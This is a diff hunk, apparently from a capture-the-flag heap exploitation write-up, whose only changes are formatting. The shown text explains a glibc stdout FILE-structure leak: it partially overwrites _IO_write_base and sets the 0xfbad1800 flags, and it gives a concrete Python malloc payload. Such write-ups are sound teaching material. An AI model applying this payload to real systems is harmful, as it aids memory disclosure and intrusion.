@@ -288,12 +288,13 @@ new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
 
 and `_IO_SYSWRITE` is basically `write`
 
-```C
+```C++
 #define _IO_SYSWRITE(FP, DATA, LEN) JUMP2 (__write, FP, DATA, LEN)
 ```
 
 `_IO_SYSWRITE` is called with `fp->_IO_write_base` as arg, so we can partially overwrite  the last byte there, and get some leaks
 we also need to set `fp->_IO_IS_APPENDING`
+
 ```python
 malloc(0x70-8, 'D'*27 + p64(0x0)*3 + p64(0xfbad1800) + p64(0x0)*3 + "\x08")```
 
